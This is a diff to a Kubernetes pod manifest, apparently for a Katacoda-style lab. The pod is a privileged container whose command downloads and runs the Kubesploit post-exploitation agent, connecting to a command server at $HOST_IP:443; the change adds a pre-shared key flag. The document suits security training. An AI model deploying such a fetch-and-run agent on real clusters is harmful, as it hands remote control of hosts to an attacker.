@@ -40,7 +40,7 @@ spec:
   containers:
   - name: priv-container
     image: ubuntu
-    command: [ "sh", "-c", "apt update && apt install wget -y && wget https://github.com/cyberark/kubesploit/releases/download/v0.1.0/kubesploitAgent-Linux-x64_katacoda && chmod +x kubesploitAgent-Linux-x64_katacoda && ./kubesploitAgent-Linux-x64_katacoda -url https://$HOST_IP:443", "sleep infinity" ]
+    command: [ "sh", "-c", "apt update && apt install wget -y && wget https://github.com/cyberark/kubesploit/releases/download/v0.1.0/kubesploitAgent-Linux-x64_katacoda && chmod +x kubesploitAgent-Linux-x64_katacoda && ./kubesploitAgent-Linux-x64_katacoda -url https://$HOST_IP:443 -psk kubesploit", "sleep infinity" ]
     securityContext:
       privileged: true
     volumeMounts:
